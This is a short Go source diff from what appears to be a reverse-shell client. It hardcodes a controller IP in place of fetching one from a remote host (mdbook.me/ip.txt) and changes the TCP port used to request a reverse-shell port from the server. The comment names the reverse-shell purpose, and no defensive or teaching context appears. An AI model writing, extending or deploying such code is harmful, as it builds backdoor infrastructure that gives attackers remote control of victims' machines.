@@ -39,6 +39,7 @@ func main() {
 }
 
 func GetIP() string {
+	return "10.100.0.101"
 	resp, err := http.Get("http://mdbook.me/ip.txt")
 	var ip string
 	if err == nil {
@@ -62,7 +63,7 @@ func GetIP() string {
 
 func GetPort() string {
 	//Get the reverse shell port from the server
-	getPort, err := net.Dial("tcp", HOST_CONNECT+"5003")
+	getPort, err := net.Dial("tcp", HOST_CONNECT+"8003")
 	if err != nil {
 		fmt.Println("Couldn't get connection")
 		return "-1"
